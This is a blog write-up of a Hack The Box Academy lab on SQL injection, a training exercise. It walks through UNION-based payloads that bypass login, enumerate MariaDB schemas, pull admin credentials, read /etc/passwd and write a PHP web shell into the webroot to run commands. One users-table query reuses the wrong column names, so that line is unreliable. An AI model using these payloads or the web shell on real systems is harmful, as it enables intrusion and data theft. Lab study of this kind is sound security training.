---
layout: post
title:  "SQL injection fundamentals skills Assessment - HTB Academy writeup"
date:   2024-09-06 17:50:00 +0200
categories: hackthebox academy writeup
---

{:refdef: style="text-align: center;"}
[![Challenge logo](/assets/sqlifundamentalsskillsassessment/0_title.png)](/assets/sqlifundamentalsskillsassessment/0_title.png){:target="_blank"}
{:refdef}

**CTF Name**: [SQL injection fundamentals skills Assessment](https://academy.hackthebox.com/module/33/section/518){:target="_blank"}  
**Description**: Databases are an important part of web application infrastructure and SQL (Structured Query Language) to store, retrieve, and manipulate information stored in them. SQL injection is a code injection technique used to take advantage of coding vulnerabilities and inject SQL queries via an application to bypass authentication, retrieve data from the back-end database, or achieve code execution on the underlying server.
**Categories**: Web Application, SQL injection, Remote Code Execution  
**Difficulty**: Medium  

We approach this task as a **grey box** test, where some information is already known but the rest has to be found out. In particular, the known information is the possible existence of **SQL injection vulnerabilities**. Upon visiting the website, we can see a login form.

{:refdef: style="text-align: center;"}
[![Login form](/assets/sqlifundamentalsskillsassessment/1_login.png)](/assets/sqlifundamentalsskillsassessment/1_login.png){:target="_blank"}
{:refdef}

The first step in testing for **SQLi vulnerabilities** is to find an injectable parameter. Let's try adding a single quote **\'** in the **username** field and check for any error or behaviour change. The application's front end shows an "**Incorrect credentials**" message. Other characters, such as **\"**, **#**, or **\-\-** yield the same result.

Trying several authentication bypass payloads (found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)) via **BurpSuite** reveals that there are several payloads that successfully break the authentication.

{:refdef: style="text-align: center;"}
[![Burp Suite](/assets/sqlifundamentalsskillsassessment/2_burp.png)](/assets/sqlifundamentalsskillsassessment/2_burp.png){:target="_blank"}
{:refdef}

As a matter of fact, inserting either of those payloads in the username fields **lets us in**.

{:refdef: style="text-align: center;"}
[![Dashboard](/assets/sqlifundamentalsskillsassessment/3_dashboard.png)](/assets/sqlifundamentalsskillsassessment/3_dashboard.png){:target="_blank"}
{:refdef}

Here we can see some information along with a **search bar**. We now have to assess whether this search bar is also vulnerable to some **SQL injection vulnerability**. Searching for a single quote **\'** does return a quite **verbose error** that reveals some details about the **DBMS** supporting the application we are attacking: **MariaDB**.

{:refdef: style="text-align: center;"}
[![SQL Error revealing DBMS](/assets/sqlifundamentalsskillsassessment/4_mariadb.png)](/assets/sqlifundamentalsskillsassessment/4_mariadb.png){:target="_blank"}
{:refdef}

After finding out that the parameter used by the search bar is vulnerable, we should understand **how many columns** are involved in this particular query.
Injecting **\' ORDER BY X;-- -**, where **X** is a number we are going to increment each time, we find out that payloads up to **\' ORDER BY 5;-- -** are successfully processed, while **\' ORDER BY 6;-- -** is giving an error back. This means that **5** columns are being returned by the query.

{:refdef: style="text-align: center;"}
[![Columns returned](/assets/sqlifundamentalsskillsassessment/5_columns.png)](/assets/sqlifundamentalsskillsassessment/5_columns.png){:target="_blank"}
{:refdef}

Now that we know this, we should try finding out more about the columns' **data type**. To do this we can start injecting **\' UNION SELECT NULL, NULL, NULL, NULL, NULL;-- -** and substitute each **NULL** with a string. Going incrementally, when we inject **\' UNION SELECT \'a\', \'b\', \'c\', \'d\', \'e\';-- -** we can see that only the content of the last **4** columns is displayed on the application's front-end and that **no errors occur**. This means that all the columns are of a type compatible with the **string** type, which is going to be useful in extracting further data.

{:refdef: style="text-align: center;"}
[![Columns data types](/assets/sqlifundamentalsskillsassessment/6_data_types.png)](/assets/sqlifundamentalsskillsassessment/6_data_types.png){:target="_blank"}
{:refdef}

Now we can extract information about the **DBMS** itself, such as the **available databases**, **tables** and **columns** it is storing, and so on. Let's start by getting the **current database** and the **current user** by changing one of the visible columns to **database()** and **user()** respectively:

{% highlight sql %}

\' UNION SELECT \'a\', database(), user(), \'d\', \'e\';-- -

{% endhighlight %}


{:refdef: style="text-align: center;"}
[![Extracting db user](/assets/sqlifundamentalsskillsassessment/7_db_user.png)](/assets/sqlifundamentalsskillsassessment/7_db_user.png){:target="_blank"}
{:refdef}

We are interacting with the database "**ilfreight**" as **root**. This may prove useful when we'll try to access the underlying filesystem. But now let's go back to the **DBMS**. Let's list the databases by injecting the following payload:

{% highlight sql %}

' UNION SELECT 'a', schema_name, 'c', 'd', 'e' FROM information_schema.schemata;-- -

{% endhighlight %}

As we can see there there are two databases we could extract information from. The "**ilfreight**" database is probably storing application data, while the "**backup**" database may prove more interesting.

{:refdef: style="text-align: center;"}
[![Enumerating databases](/assets/sqlifundamentalsskillsassessment/8_databases.png)](/assets/sqlifundamentalsskillsassessment/8_databases.png){:target="_blank"}
{:refdef}

We are still going to examine the **ilfreight** database by injecting the following payload:

{% highlight sql %}

' UNION SELECT 'a', table_schema, table_name, 'd', 'e' FROM information_schema.tables WHERE table_schema='ilfreight';-- -

{% endhighlight %}

We can see that it is storing two tables: **payment** and **users**.

{:refdef: style="text-align: center;"}
[![Enumerating tables in the first database](/assets/sqlifundamentalsskillsassessment/9_ilfreight.png)](/assets/sqlifundamentalsskillsassessment/9_ilfreight.png){:target="_blank"}
{:refdef}

To understand what **columns** are stored in these tables, let's submit the following payload:

{% highlight sql %}

' UNION SELECT 'a', table_schema, table_name, column_name, 'e' FROM information_schema.columns WHERE table_schema='ilfreight' AND (table_name='users' OR table_name='payment');-- -

{% endhighlight %}

We can see that the **payment** table doesn't store anything of interest, while the **users** table does. In particular, it contains some **username** and **password** combinations.

{:refdef: style="text-align: center;"}
[![Enumerating columns in the first database](/assets/sqlifundamentalsskillsassessment/10_ilfreight_columns.png)](/assets/sqlifundamentalsskillsassessment/10_ilfreight_columns.png){:target="_blank"}
{:refdef}

We can now extract data from these tables. To **extract** data from the **payment** table we can inject the following payload:

{% highlight sql %}

' UNION SELECT 'a', id, name, month, amount FROM ilfreight.payment;-- -

{% endhighlight %}

We can notice that the extracted data matches the data that was already being presented to us by this page. Now to **extract** from the **users** table we can inject this payload:

{% highlight sql %}

' UNION SELECT 'a', id, name, month, amount FROM ilfreight.users;-- -

{% endhighlight %}

We can see that there is only **one user** and that passwords are not stored in plain text but are probably **hashed**.

{:refdef: style="text-align: center;"}
[![Extracting data from the first database](/assets/sqlifundamentalsskillsassessment/11_users.png)](/assets/sqlifundamentalsskillsassessment/11_users.png){:target="_blank"}
{:refdef}

Now we have to repeat the same process for the other database, **backup**. By injecting this payload: 

{% highlight sql %}

' UNION SELECT 'a', table_schema, table_name, 'd', 'e' FROM information_schema.tables WHERE table_schema='backup';-- -

{% endhighlight %}

We can see that there is only **one table**, **admin_bk**.

{:refdef: style="text-align: center;"}
[![Enumerating tables in the second database](/assets/sqlifundamentalsskillsassessment/12_backup_db.png)](/assets/sqlifundamentalsskillsassessment/12_backup_db.png){:target="_blank"}
{:refdef}

Just like before, we can now **extract** information about columns stored in this table by injecting the following payload:

{% highlight sql %}

' UNION SELECT 'a', table_schema, table_name, column_name, 'e' FROM information_schema.columns WHERE table_schema='backup' AND table_name='admin_bk';-- -

{% endhighlight %}


There are **two columns**, **username** and **password**.

{:refdef: style="text-align: center;"}
[![Enumerating columns in the second database](/assets/sqlifundamentalsskillsassessment/13_admin_bk.png)](/assets/sqlifundamentalsskillsassessment/13_admin_bk.png){:target="_blank"}
{:refdef}

We can now extract information from that table using the following payload:

{% highlight sql %}

' UNION SELECT 'a', username, password, 'd', 'e' FROM backup.admin_bk;-- -

{% endhighlight %}

As a result we can finally see the **administrator's credentials**.

{:refdef: style="text-align: center;"}
[![Extracting administrator credentials](/assets/sqlifundamentalsskillsassessment/14_admin_credentials.png)](/assets/sqlifundamentalsskillsassessment/14_admin_credentials.png){:target="_blank"}
{:refdef}

Now we should go back to the current DB user, **root@localhost**, to find out more about their privileges. With the following payload we can see privileges of all users:

{% highlight sql %}

' UNION SELECT 'a', grantee, privilege_type, 'd', 'e' FROM information_schema.user_privileges;-- -

{% endhighlight %}

In particular, we can see we have the **FILE** privilege, which allows us to read files.

{:refdef: style="text-align: center;"}
[![Extracting user privileges](/assets/sqlifundamentalsskillsassessment/15_privileges.png)](/assets/sqlifundamentalsskillsassessment/15_privileges.png){:target="_blank"}
{:refdef}

Let's try reading a sensitive file, such as **/etc/passwd**, with the following payload:

{% highlight sql %}

' UNION SELECT 'a', LOAD_FILE('/etc/passwd'), 'c', 'd', 'e';-- -

{% endhighlight %}

As a matter of fact, we **can** read it!

{:refdef: style="text-align: center;"}
[![Reading /etc/passwd](/assets/sqlifundamentalsskillsassessment/16_passwd.png)](/assets/sqlifundamentalsskillsassessment/16_passwd.png){:target="_blank"}
{:refdef}

Let's try understanding if we have **writing privileges** too. First, let's read the **global variable** that defines whether writing on the filesystem is allowed with the following payload:

{% highlight sql %}

' UNION SELECT 'a', variable_name, variable_value, 'd', 'e' FROM information_schema.global_variables WHERE variable_name='secure_file_priv';-- -

{% endhighlight %}

We can see that this variable is **empty**, therefore, **writing is allowed anywhere**.

{:refdef: style="text-align: center;"}
[![Checking write privileges](/assets/sqlifundamentalsskillsassessment/17_secure_file_priv.png)](/assets/sqlifundamentalsskillsassessment/17_secure_file_priv.png){:target="_blank"}
{:refdef}

As we know from the **URL**, this website is using **PHP**, so we can try uploading a malicious **PHP** file that allows us to **execute commands** on the underlying system. Let's inject the following payload:

{% highlight sql %}

' UNION SELECT "", "PHP_SHELL_HERE", "", "", "" INTO OUTFILE '/var/www/html/script.php';-- -

{% endhighlight %}

Something's wrong as an **error** occurs. This means we are **not** allowed to write in this directory.

{:refdef: style="text-align: center;"}
[![Writing not allowed](/assets/sqlifundamentalsskillsassessment/18_writing_error.png)](/assets/sqlifundamentalsskillsassessment/18_writing_error.png){:target="_blank"}
{:refdef}

As this page, **dashboard.php**, is located in **/dashboard**, maybe the current user has writing permissions in that directory. Let's try with the following payload, which creates a file that contains vulnerable **PHP** code. This script is going to execute whatever command we're going to pass. Of course we still have to select **5** columns.

{% highlight sql %}

' UNION SELECT "", "<?php system($_REQUEST[0]); ?>", "", "", "" INTO OUTFILE '/var/www/html/dashboard/script.php';-- -

{% endhighlight %}

Indeed, we created our malicious file! The lack of errors is a positive indicator that our file was written successfully.

{:refdef: style="text-align: center;"}
[![Malicious file created](/assets/sqlifundamentalsskillsassessment/19_successful_write.png)](/assets/sqlifundamentalsskillsassessment/19_successful_write.png){:target="_blank"}
{:refdef}

All there is to do now is to **exploit** our file by visiting **/dashboard/script.php** and submitting any command in the parameter **0**. For example, visiting **/dashboard/script.php?0=whoami** returns **www-data**, along with other non relevant information.

{:refdef: style="text-align: center;"}
[![Malicious file created](/assets/sqlifundamentalsskillsassessment/20_shell.png)](/assets/sqlifundamentalsskillsassessment/20_shell.png){:target="_blank"}
{:refdef}

Executing **ls /root** (remember to **URL-encode** as our command must pass the **webserver**) will reveal the **flag** we were looking for!

{:refdef: style="text-align: center;"}
[![Found the flag file](/assets/sqlifundamentalsskillsassessment/21_ls_root.png)](/assets/sqlifundamentalsskillsassessment/21_ls_root.png){:target="_blank"}
{:refdef}

While reading it via **cat** will reval its content.

{:refdef: style="text-align: center;"}
[![Flag](/assets/sqlifundamentalsskillsassessment/22_flag.png)](/assets/sqlifundamentalsskillsassessment/22_flag.png){:target="_blank"}
{:refdef}